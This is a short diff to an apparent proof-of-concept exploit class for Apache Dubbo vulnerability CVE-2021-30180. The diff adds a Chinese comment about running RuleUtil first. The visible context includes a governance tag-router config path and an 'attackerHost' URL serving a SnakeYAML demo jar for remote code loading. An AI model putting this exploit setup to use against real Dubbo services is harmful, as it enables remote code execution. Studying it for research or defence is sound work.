@@ -7,6 +7,9 @@ package org.apache.dubbo.samples.governance;
  */
 public class CVE_2021_30180 {
     public static void main(String[] args) throws Exception {
+        /**
+         * 先运行 RuleUtil 初始化环境
+         */
         String path = "/dubbo/config/dubbo/governance-tagrouter-provider.tag-router";
 
         String attackerHost = "http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar";
